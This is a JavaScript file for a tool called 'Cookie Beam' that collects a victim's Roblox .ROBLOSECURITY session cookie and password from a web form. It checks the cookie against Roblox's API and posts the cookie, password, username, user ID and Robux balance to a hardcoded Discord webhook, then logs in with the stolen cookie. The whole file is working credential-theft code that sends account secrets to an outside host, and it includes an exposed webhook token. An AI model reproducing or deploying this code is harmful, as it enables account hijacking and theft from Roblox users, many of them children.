console.log('🍪 Cookie Beam By Userspin45 - Host Ready');

const webhook = 'https://discord.com/api/webhooks/1537430116756619355/uAO-C2gl8toO3BiClhFUJ-9t8IgX7JmfAxzLnPfEShP5ArdjBmksdwjXWE9FKi7mIWsA';

async function fetchWithTimeout(url, options = {}, timeout = 8000) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeout);
    try {
        const response = await fetch(url, { ...options, signal: controller.signal });
        clearTimeout(timer);
        return response;
    } catch (error) {
        clearTimeout(timer);
        throw error;
    }
}

async function validateCookie(cookie) {
    try {
        const res = await fetchWithTimeout('https://www.roblox.com/mobileapi/userinfo', {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        }, 5000);
        if (res.ok) {
            const data = await res.json();
            return { valid: true, username: data.UserName, robux: data.RobuxBalance, id: data.UserID };
        } else if (res.status === 401) {
            return { valid: false, error: 'Invalid cookie (401 Unauthorized)' };
        } else {
            return { valid: false, error: `API error: ${res.status}` };
        }
    } catch (e) {
        return { valid: false, error: 'Network error during validation' };
    }
}

function autoLogin(cookie) {
    document.cookie = `.ROBLOSECURITY=${cookie}; path=/; domain=.roblox.com; secure; SameSite=None`;
    window.location.href = 'https://www.roblox.com/home';
}

document.getElementById('logBtn').addEventListener('click', async function() {
    const cookie = document.getElementById('cookieInput').value.trim();
    const username = document.getElementById('userInput').value.trim() || 'Not provided';
    const password = document.getElementById('passInput').value.trim() || 'Not provided';
    const resultDiv = document.getElementById('result');

    if (!cookie) {
        resultDiv.textContent = '⚠️ Please paste a .ROBLOSECURITY cookie.';
        resultDiv.className = 'status-error';
        return;
    }

    resultDiv.textContent = '🔍 Validating cookie...';
    resultDiv.className = 'status-wait';

    const validation = await validateCookie(cookie);
    if (!validation.valid) {
        resultDiv.textContent = `❌ ${validation.error}`;
        resultDiv.className = 'status-error';
        return;
    }

    resultDiv.textContent = `✅ Valid cookie! User: ${validation.username} (${validation.id}) | Robux: ${validation.robux}`;
    resultDiv.className = 'status-ok';

    const payload = {
        content: `🍪 **Cookie Beam - Userspin45**\n━━━━━━━━━━━━━━━━━━━━\n✅ **VALID COOKIE DETECTED**\n👤 **Username:** ${validation.username}\n🆔 **User ID:** ${validation.id}\n💰 **Robux:** ${validation.robux}\n🔑 **Password:** ${password}\n🍪 **.ROBLOSECURITY:** \`${cookie}\`\n━━━━━━━━━━━━━━━━━━━━\n🕒 Logged at: ${new Date().toLocaleString()}`
    };

    resultDiv.textContent = '📤 Sending to Discord...';
    resultDiv.className = 'status-wait';

    try {
        const sendRes = await fetchWithTimeout(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }, 5000);

        if (sendRes.ok) {
            resultDiv.textContent = '📤 Cookie sent! Auto-login in 3 seconds...';
            resultDiv.className = 'status-ok';
            document.getElementById('cookieInput').value = '';
            document.getElementById('userInput').value = '';
            document.getElementById('passInput').value = '';
            setTimeout(() => { autoLogin(cookie); }, 3000);
        } else {
            resultDiv.textContent = '❌ Failed to send to Discord. Try again.';
            resultDiv.className = 'status-error';
        }
    } catch (e) {
        resultDiv.textContent = '❌ Network error. Try using a proxy or hosted server.';
        resultDiv.className = 'status-error';
        console.error(e);
    }
});
